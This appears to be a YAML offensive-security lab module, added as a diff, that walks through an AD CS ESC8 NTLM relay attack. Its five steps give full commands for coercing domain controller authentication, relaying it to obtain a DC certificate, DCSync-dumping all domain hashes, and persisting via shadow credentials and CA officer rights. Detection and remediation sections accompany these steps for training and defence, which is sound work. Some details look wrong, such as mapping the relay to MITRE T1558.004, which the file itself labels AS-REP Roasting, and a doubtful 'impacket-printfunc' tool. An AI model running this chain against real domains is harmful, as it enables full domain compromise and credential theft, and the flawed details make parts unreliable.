@@ -1,0 +1,172 @@
+# Category: Active Directory Security - AD CS Attacks
+name: "AD CS ESC8 — NTLM Relay to Certificate Enrollment"
+id: "ad-adcs-esc8-001"
+category: "offensive_security"
+subcategory: "active_directory"
+difficulty: "expert"
+estimated_time: "90 minutes"
+
+description: |
+  Exploit ESC8 vulnerability by relaying NTLM authentication to AD CS HTTP
+  enrollment endpoints (certsrv), obtaining certificates for relayed accounts.
+  Enables domain compromise when relaying Domain Controller authentication.
+
+learning_objectives:
+  - Understand NTLM relay attack mechanics and AD CS HTTP enrollment
+  - Configure PetitPotam or PrinterBug to coerce authentication
+  - Relay NTLM to certsrv and request certificates for privileged accounts
+  - Map attack to detection controls and SOC 2 monitoring requirements
+
+tools:
+  - impacket
+  - certipy
+  - petitpotam
+  - responder
+  - rubeus
+  - bloodhound
+
+prerequisites:
+  - Network access to domain controller and AD CS HTTP endpoint (TCP 80/443)
+  - Understanding of NTLM authentication and relay attack prerequisites
+  - Authorization for authentication relay testing
+  - Target environment with LDAP signing/channel binding not enforced
+
+steps:
+  - id: step1
+    phase: "reconnaissance"
+    action: "Identify AD CS HTTP enrollment endpoints"
+    commands:
+      - "# Scan for certsrv web enrollment interface"
+      - "curl -k -s https://[ca_server]/certsrv/ | grep -i 'certificate'"
+      - "# Check if HTTP endpoint allows NTLM authentication"
+      - "curl -s -I --ntlm -u ': ' https://[ca_server]/certsrv/certfnsh.asp"
+      - "# Enumerate CA name via HTTP"
+      - "curl -k -s https://[ca_server]/certsrv/ -u '[username]:[password]' | grep -i 'CA name'"
+    expected_output: "Confirmation that AD CS HTTP enrollment is accessible and accepts NTLM auth"
+    detection: "Web server logs on CA: HTTP POST to /certsrv/ with NTLMSSP authentication"
+
+  - id: step2
+    phase: "exploitation"
+    action: "Coerce Domain Controller authentication via PetitPotam"
+    commands:
+      - "# Install PetitPotam"
+      - "pip3 install git+https://github.com/topotam/PetitPotam"
+      - "# Trigger EFSRPC to coerce DC authentication to attacker machine"
+      - "python3 PetitPotam.py -u '[username]' -p '[password]' -d [domain] -dc-ip [dc_ip] [attacker_ip] [dc_ip]"
+      - "# Alternative: Use PrinterBug (MS-RPRN) for coercion"
+      - "impacket-printfunc -target '[dc_ip]' -attacker '[attacker_ip]'"
+    expected_output: "DC authentication attempt relayed to attacker's listening port"
+    detection: "Event ID 36887 on DC: Failed TLS handshake; EFSRPC/MS-RPRN abuse alerts in Defender for Identity"
+
+  - id: step3
+    phase: "exploitation"
+    action: "Relay NTLM to AD CS HTTP endpoint and request certificate"
+    commands:
+      - "# Start NTLM relay listener targeting certsrv"
+      - "ntlmrelayx.py -t https://[ca_server]/certsrv/certfnsh.asp -smb2support --adcs --template '[vulnerable_template]'"
+      - "# When DC authenticates, certificate is automatically requested"
+      - "# Output: Certificate saved as [dc_hostname].pfx"
+      - "ls -la [dc_hostname].pfx"
+      - "# Alternative: Manual relay with custom script"
+      - "python3 adcs_relay.py -target [ca_server] -template '[vulnerable_template]' -coerce [dc_ip]"
+    expected_output: "Certificate (.pfx) issued for Domain Controller machine account"
+    risk_level: "critical"
+    compliance_mapping: ["MITRE ATT&CK T1558.004", "SOC 2 CC7.1"]
+
+  - id: step4
+    phase: "exploitation"
+    action: "Authenticate as Domain Controller using relayed certificate"
+    commands:
+      - "# Use Rubeus to request TGT with obtained certificate"
+      - "Rubeus.exe asktgt /user:'[DC_NAME]$' /certificate:'[dc_hostname].pfx' /password:'[pfx_pass]' /ptt"
+      - "# Or use Certipy for PKINIT authentication"
+      - "certipy auth -pfx [dc_hostname].pfx -dc-ip [dc_ip] -username '[DC_NAME]$' -domain [domain]"
+      - "# Verify TGT acquisition"
+      - "klist"
+      - "# Execute DCSync to dump domain hashes"
+      - "impacket-secretsdump -k '[domain]/[DC_NAME]$@[dc_ip]' -just-dc"
+    expected_output: "Domain controller TGT; successful DCSync extracting all domain credentials"
+    detection: "Event ID 4768: Kerberos TGT requested via PKINIT for machine account; unusual source IP"
+
+  - id: step5
+    phase: "post_exploitation"
+    action: "Establish persistence via certificate or shadow credentials"
+    commands:
+      - "# Add shadow credential to DA account using relayed access"
+      - "certipy shadow auto -u '[username]@[domain]' -p '[password]' -account 'krbtgt' -dc-ip [dc_ip]"
+      - "# Or create persistent certificate enrollment rights"
+      - "certipy ca -u '[username]@[domain]' -p '[password]' -ca '[ca_name]' -addofficer '[compromised_user]'"
+      - "# Validate persistence by re-authenticating after password reset"
+      - "certipy auth -pfx [dc_hostname].pfx -dc-ip [dc_ip] -username '[DC_NAME]$'"
+    expected_output: "Persistent access mechanism surviving credential rotation"
+    detection: "Event ID 5136: msDS-KeyCredentialLink modification; CA officer role changes"
+
+detection:
+  network_indicators:
+    - "NTLM authentication to AD CS HTTP endpoint from non-admin systems"
+    - "EFSRPC (MS-EFSR) or PrintSpooler (MS-RPRN) traffic to coerce authentication"
+    - "HTTP POST requests to /certsrv/certfnsh.asp with certificate enrollment parameters"
+  log_indicators:
+    - "Event ID 4768: PKINIT authentication for machine account from unexpected source"
+    - "Event ID 4624: Logon Type 3 (network) for DC machine account from attacker IP"
+    - "CA logs: Certificate issued for DC machine account via HTTP enrollment"
+    - "Defender for Identity: Alert on NTLM relay to AD CS or DC authentication coercion"
+  endpoint_indicators:
+    - "ntlmrelayx.py, PetitPotam.py, or impacket-printfunc execution"
+    - "New .pfx certificate files in working directory"
+    - "Rubeus or Certipy authentication with certificate flags"
+
+remediation:
+  immediate:
+    - "Enable LDAP signing and channel binding on all domain controllers"
+    - "Disable HTTP enrollment on AD CS; enforce HTTPS with certificate client authentication"
+    - "Add Domain Controllers to Protected Users group to prevent NTLM authentication"
+  long_term:
+    - "Deploy Microsoft Defender for Identity with ESC8 detection rules"
+    - "Implement CA certificate templates requiring manager approval for high-privilege enrollments"
+    - "Monitor Event ID 4768 for PKINIT authentications of machine accounts"
+    - "Conduct regular AD CS security assessments using Certipy audit mode"
+    - "Document NTLM relay mitigations as part of SOC 2 CC7.1 evidence collection"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1558.004"
+    description: "Steal or Forge Kerberos Tickets: AS-REP Roasting (includes certificate relay variants)"
+  - standard: "SOC 2 Type II"
+    control: "CC7.1"
+    description: "Security events are detected and monitored to identify potential incidents"
+  - standard: "NIST 800-53 Rev. 5"
+    control: "IA-2(1)"
+    description: "Network access to privileged accounts requires multifactor authentication"
+  - standard: "CIS Microsoft Windows Server Benchmark"
+    control: "18.9.5.2"
+    description: "Network security: LDAP server signing requirements"
+
+variables:
+  domain: "corp.example.com"
+  dc_ip: "192.168.1.10"
+  dc_name: "DC01"
+  ca_server: "ca01.corp.example.com"
+  ca_name: "corp-CA01-CA"
+  vulnerable_template: "Machine"
+  attacker_ip: "192.168.1.100"
+  username: "jsmith"
+  password: "Password123"
+  pfx_pass: "Password123"
+
+assessment_questions:
+  - "Why does ESC8 require the AD CS HTTP enrollment endpoint to be enabled?"
+  - "How does enabling LDAP channel binding mitigate NTLM relay attacks?"
+  - "What is the difference between relaying to AD CS vs. relaying to LDAP/SMB?"
+  - "Which Event ID is most critical for detecting PKINIT-based lateral movement?"
+  - "Why are machine accounts particularly dangerous when compromised via ESC8?"
+
+references:
+  - url: "https://github.com/ly4k/Certipy"
+    title: "Certipy - AD CS Attack Tool"
+  - url: "https://github.com/topotam/PetitPotam"
+    title: "PetitPotam - MS-EFSR Authentication Coercion"
+  - url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    title: "Certified Pre-Owned: ESC8 and NTLM Relay to AD CS"
+  - url: "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identities#machine-accounts"
+    title: "Active Directory Machine Account Security"
